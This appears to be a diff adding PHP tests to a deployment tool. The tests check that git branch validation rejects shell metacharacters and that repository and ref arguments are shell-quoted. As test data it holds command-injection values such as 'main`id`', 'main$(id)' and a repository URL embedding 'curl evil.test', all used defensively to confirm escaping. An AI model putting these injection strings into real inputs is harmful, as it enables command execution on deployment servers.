@@ -1,6 +1,8 @@
 <?php
 
 use App\Jobs\ApplicationDeploymentJob;
+use App\Models\Application;
+use App\Models\ApplicationSetting;
 use App\Rules\ValidGitBranch;
 use App\Support\ValidationPatterns;
 
@@ -128,6 +130,38 @@ describe('deployment job path field validation', function () {
 });
 
 describe('API validation rules for path fields', function () {
+    test('git_branch validation rejects shell metacharacters', function (string $branch) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $branch],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with([
+        'backtick command substitution' => 'main`id`',
+        'dollar command substitution' => 'main$(id)',
+        'semicolon command separator' => 'main;id',
+        'ifs shell expansion' => 'main${IFS}id',
+        'space separator' => 'main branch',
+    ]);
+
+    test('git_branch validation allows safe branch names', function (string $branch) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $branch],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'main',
+        'feature/safe-branch',
+        'release_2026.06',
+    ]);
+
     test('dockerfile_location validation rejects shell metacharacters', function () {
         $rules = sharedDataApplications();
 
@@ -181,6 +215,68 @@ describe('API validation rules for path fields', function () {
         );
 
         expect($validator->fails())->toBeFalse();
+    });
+});
+
+describe('deployment git command escaping', function () {
+    test('ls-remote command shell-quotes repository and ref arguments', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $instance = $job->newInstanceWithoutConstructor();
+
+        foreach ([
+            'customPort' => 22,
+            'fullRepoUrl' => "git@example.com:org/repo.git'; curl evil.test; #",
+        ] as $property => $value) {
+            $reflectionProperty = $job->getProperty($property);
+            $reflectionProperty->setAccessible(true);
+            $reflectionProperty->setValue($instance, $value);
+        }
+
+        $method = $job->getMethod('gitLsRemoteCommand');
+        $method->setAccessible(true);
+
+        $command = $method->invoke($instance, 'refs/heads/main`id`', '/root/.ssh/id_rsa');
+
+        expect($command)
+            ->toContain("git ls-remote 'git@example.com:org/repo.git'\\''; curl evil.test; #' 'refs/heads/main`id`'")
+            ->toContain('-i /root/.ssh/id_rsa')
+            ->not->toContain('repo.git; curl');
+    });
+
+    test('coolify branch shell assignment is quoted', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $instance = $job->newInstanceWithoutConstructor();
+
+        $application = new Application;
+        $application->uuid = 'app-uuid';
+        $application->git_branch = 'main`id`';
+        $application->fqdn = null;
+        $application->compose_parsing_version = '3';
+
+        $settings = new ApplicationSetting;
+        $settings->include_source_commit_in_build = false;
+        $application->setRelation('settings', $settings);
+
+        foreach ([
+            'application' => $application,
+            'commit' => 'HEAD',
+            'pull_request_id' => 0,
+        ] as $property => $value) {
+            $reflectionProperty = $job->getProperty($property);
+            $reflectionProperty->setAccessible(true);
+            $reflectionProperty->setValue($instance, $value);
+        }
+
+        $method = $job->getMethod('set_coolify_variables');
+        $method->setAccessible(true);
+        $method->invoke($instance);
+
+        $coolifyVariables = $job->getProperty('coolify_variables');
+        $coolifyVariables->setAccessible(true);
+
+        expect($coolifyVariables->getValue($instance))
+            ->toContain("COOLIFY_BRANCH='main`id`' ")
+            ->toContain('COOLIFY_RESOURCE_UUID=app-uuid ');
     });
 });
 
